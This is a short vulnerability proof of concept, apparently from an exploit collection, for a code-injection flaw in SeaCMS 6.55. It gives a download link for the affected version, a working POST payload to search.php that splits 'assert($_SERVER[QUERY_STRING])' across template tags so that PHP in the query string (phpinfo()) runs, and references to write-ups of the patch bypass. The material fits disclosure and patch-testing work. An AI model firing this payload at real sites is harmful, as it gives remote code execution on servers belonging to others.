## Affected Version 6.55

链接:https://pan.baidu.com/s/1UmbsQjQ4o4JFtK1MLHtf3g  
密码:k4x1

## POC

	http://192.168.0.6/seacms655/search.php?phpinfo(); 
	post:
	searchtype=5&searchword={if{searchpage:year}&year=:as{searchpage:area}}&area=s{searchpage:letter}&letter=ert{searchpage:lang}&yuyan=($_SE{searchpage:jq}&jq=RVER{searchpage:ver}&&ver=[QUERY_STRING]));/*

![](http://opmi2ydgh.bkt.clouddn.com//18-7-18/40373679.jpg)

## References

[海洋CMS（SEACMS）新版本V6.55补丁仍可被绕过执行任意代码](http://www.freebuf.com/vuls/150303.html)

[seacms 6.55 代码注入漏洞](https://github.com/SukaraLin/php_code_audit_project/blob/master/seacms/seacms%206.55%20%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md)